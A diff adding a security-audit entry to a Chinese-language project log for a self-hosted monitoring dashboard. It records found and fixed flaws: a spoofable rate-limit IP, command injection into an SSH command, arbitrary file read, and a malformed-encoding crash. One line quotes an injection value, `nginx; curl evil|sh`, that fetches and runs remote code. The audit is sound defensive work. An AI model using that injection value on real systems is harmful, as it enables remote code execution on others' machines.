@@ -404,3 +404,13 @@ D 全新数据、不设 `KUMA_URL`、本机 3001 有 Kuma → `configured:true, 
   README 两版更新 badge（CI / 许可 / 镜像 / 390 单测）、坑数改 47，删掉「no accounts, no cloud, no Docker」那句。
 - 验证：`pnpm test` 全绿（390 单测 + 7 片段）、`node tests/run.mjs --only=ci` 通过、全量 e2e 15/15。**GitHub 上第一次真实运行还没发生**
   （workflow 这次才进仓库）；`docker` job 会是镜像的第一次真实构建。
+
+**已完成（2026-10-26，安全审查）**：在隔离环境（`E:\bqj\scratch\pinfolio-audit`，clone dev 起 7801 普通实例 + 7802 `TRUST_PROXY=1` 实例）做了一次真实审查：
+白盒过了一遍鉴权中间件、静态托管、备份下载、远端表名、XSS 两处（便签 Markdown 与邮件 HTML）、子进程与 SQL 拼接，黑盒用 curl / Playwright 打了路径穿越、
+备份名穿越、CSRF（4 种 Content-Type 全 415）、登录限流、畸形编码、未登录接口、XSS 载荷七种。**没有未认证的远程利用点**，修了四处真问题：
+① 登录限流取 `X-Forwarded-For` 第一段（客户端可伪造，实测 12 次错密码零 429）→ 改取最后一段（`pickClientIp()`，同样场景 5 次就 429）；
+② systemd 单元名直接拼进 Kuma 的 `ssh_command`（`nginx; curl evil|sh` 会在被监测机上执行）→ 加 `UNIT_RE` 白名单；
+③ 「读私钥」的 `keyPath` 来自请求体，等于任意文件读取（实测能读 `data/secret.key`）→ 只收真私钥且限 64 KB；
+④ 畸形 URL 编码让 `decodeURIComponent` 抛错冒到 `onError` 变 500 → 回 400。另加安全响应头（nosniff / X-Frame-Options / Referrer-Policy / Permissions-Policy / CSP 的 frame-ancestors+base-uri / HTTPS 下 HSTS）。
+新增 `tests/unit/auth-ip.test.mts` 3 例、`tests/unit/kuma-provision.test.mts` 2 例，`pnpm test` 395/395 + 7 片段全绿；坑记到 `docs/pitfalls.md` 48–51。
+仍属「已知且接受」的：认证后的 SSRF（公网访问卡的探活、远端库测试连接）、`onError` 把 `err.message` 回给客户端、`GET /api/hosts` 在没有指标源时报错而 `POST` 能写、没有完整 CSP。
